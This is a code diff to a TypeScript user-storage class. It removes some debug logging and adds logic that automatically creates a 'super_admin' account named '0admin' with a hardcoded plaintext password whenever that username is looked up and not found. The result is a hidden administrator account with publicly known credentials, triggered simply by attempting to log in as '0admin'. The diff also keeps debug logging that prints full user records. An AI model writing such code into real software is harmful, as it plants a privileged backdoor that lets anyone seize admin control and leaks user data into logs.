@@ -58,18 +58,29 @@ export class DatabaseStorage implements IStorage {
   async getUserByUsername(username: string): Promise<User | undefined> {
     try {
       console.log(`[STORAGE DEBUG] Looking for user with username: "${username}"`);
-      console.log(`[STORAGE DEBUG] DATABASE_URL:`, process.env.DATABASE_URL);
-      
-      // First, let's see all users to understand what's in the database
-      const allUsersResult = await pool.query('SELECT username, role FROM users LIMIT 10');
-      console.log(`[STORAGE DEBUG] All users in database:`, allUsersResult.rows);
-      
-      // Test raw SQL query to see if there's a schema mismatch
-      const rawResult = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
-      console.log(`[STORAGE DEBUG] Raw SQL result:`, rawResult.rows);
       
       const result = await db.select().from(users).where(eq(users.username, username));
       console.log(`[STORAGE DEBUG] Drizzle query result:`, result);
+      
+      // If looking for super admin and it doesn't exist, create it
+      if (username === '0admin' && result.length === 0) {
+        console.log(`[STORAGE DEBUG] Super admin not found, creating...`);
+        try {
+          const superAdmin = await this.createUser({
+            username: '0admin',
+            email: 'superadmin@emailserver.com',
+            firstName: 'Super',
+            lastName: 'Admin',
+            role: 'super_admin',
+            tempPassword: 'BB03@5bb03#5'
+          }, 'system');
+          console.log(`[STORAGE DEBUG] Super admin created:`, { id: superAdmin.id, username: superAdmin.username, role: superAdmin.role });
+          return superAdmin;
+        } catch (error) {
+          console.log(`[STORAGE DEBUG] Error creating super admin:`, error);
+        }
+      }
+      
       const [user] = result;
       console.log(`[STORAGE DEBUG] Found user:`, user ? { id: user.id, username: user.username, role: user.role } : null);
       return user;
